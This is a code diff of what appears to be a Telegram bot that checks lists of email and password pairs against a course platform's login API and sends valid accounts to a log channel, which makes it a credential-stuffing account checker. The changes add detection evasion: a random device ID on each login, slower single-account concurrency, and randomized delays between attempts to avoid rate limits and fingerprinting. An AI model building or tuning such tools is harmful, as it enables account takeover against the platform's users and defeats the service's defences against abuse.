@@ -1,5 +1,6 @@
 import asyncio
 import requests
+import uuid
 from Extractor import app
 from pyrogram import filters
 from asyncio import Lock
@@ -7,13 +8,11 @@ from config import PREMIUM_LOGS
 
 # ================= CONFIG =================
 LOG_CHANNEL_ID = PREMIUM_LOGS   # <-- change this
-SEM = asyncio.Semaphore(2)
 
-# ===== RATE CONTROL =====
-REQUEST_DELAY = 0.5               # 0.5 sec per account
-LOG_DELAY = 1.0                   # 1 sec before log send
-PROGRESS_UPDATE_EVERY = 50        # update after 50 checks
-
+SEM = asyncio.Semaphore(1)   # ONLY 1 account at a time
+REQUEST_DELAY = 1.2         # 1.2 sec after every account
+LOG_DELAY = 1.5             # log channel safe
+PROGRESS_UPDATE_EVERY = 50
 # ================= GLOBAL STATE =================
 stats = {
     "checked": 0,
@@ -67,7 +66,7 @@ async def login_and_get_courses(n, p, api, bot, progress_msg):
             "email": n,
             "password": p,
             "devicetoken": "",
-            "mydeviceid": "b9ed63e5d2a"
+            "mydeviceid": uuid.uuid4().hex[:16]
         }
 
         loop = asyncio.get_running_loop()
@@ -171,7 +170,7 @@ async def login_and_get_courses(n, p, api, bot, progress_msg):
             )
 
         print(f"[END] {n} valid={is_valid}")
-        await asyncio.sleep(REQUEST_DELAY)                            
+        await asyncio.sleep(REQUEST_DELAY + random.uniform(0.3, 0.7))                           
 # ================= COMMAND =================
 @app.on_message(filters.command("babe"))
 async def pw_command_handler(bot, m):
